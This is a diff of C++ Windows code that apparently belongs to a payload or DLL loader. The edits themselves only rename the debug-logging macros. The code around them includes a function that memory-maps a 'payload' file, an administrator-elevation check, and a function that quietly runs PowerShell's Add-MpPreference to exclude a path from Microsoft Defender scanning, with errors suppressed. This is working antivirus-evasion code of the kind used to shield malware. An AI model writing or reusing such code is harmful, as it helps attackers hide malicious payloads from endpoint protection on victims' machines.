@@ -28,14 +28,14 @@ BYTE *buffer_payload(wchar_t *filename, OUT size_t &r_size)
 {
     HANDLE file = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
     if(file == INVALID_HANDLE_VALUE) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "Could not open file!" << std::endl;
 #endif
         return nullptr;
     }
     HANDLE mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0);
     if (!mapping) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "Could not create mapping!" << std::endl;
 #endif
         CloseHandle(file);
@@ -43,7 +43,7 @@ BYTE *buffer_payload(wchar_t *filename, OUT size_t &r_size)
     }
     BYTE *dllRawData = (BYTE*) MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
     if (dllRawData == nullptr) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "Could not map view of file" << std::endl;
 #endif
         CloseHandle(mapping);
@@ -640,14 +640,14 @@ bool IsRunningAsAdmin() {
     DWORD dwSize = sizeof(TOKEN_ELEVATION);
 
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "[-] Failed to open process token" << std::endl;
 #endif
         return false;
     }
 
     if (!GetTokenInformation(hToken, TokenElevation, &elevation, dwSize, &dwSize)) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "[-] Failed to get token information" << std::endl;
 #endif
         CloseHandle(hToken);
@@ -664,7 +664,7 @@ bool IsRunningAsAdmin() {
 bool AddDefenderExclusion(const std::string& path) {
     // Only attempt if running as admin
     if (!IsRunningAsAdmin()) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "[-] Not running as admin, cannot add Defender exclusion" << std::endl;
 #endif
         return false;
@@ -673,7 +673,7 @@ bool AddDefenderExclusion(const std::string& path) {
     // Build PowerShell command to add exclusion
     std::string psCommand = "powershell -NoProfile -NonInteractive -Command \"Add-MpPreference -ExclusionPath '" + path + "' -Force -ErrorAction SilentlyContinue\"";
 
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[*] Attempting to add Defender exclusion for: " << path << std::endl;
 #endif
 
@@ -705,7 +705,7 @@ bool AddDefenderExclusion(const std::string& path) {
     );
 
     if (!result) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "[-] Failed to create PowerShell process (error: " << GetLastError() << ")" << std::endl;
 #endif
         return false;
@@ -723,13 +723,13 @@ bool AddDefenderExclusion(const std::string& path) {
     CloseHandle(pi.hThread);
 
     if (exitCode != 0) {
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
         std::cerr << "[-] PowerShell command failed with exit code: " << exitCode << std::endl;
 #endif
         return false;
     }
 
-#ifdef _DEBUG
+#ifdef ENABLE_DEBUG_CONSOLE
     std::cout << "[+] Successfully added Defender exclusion for: " << path << std::endl;
 #endif
     return true;
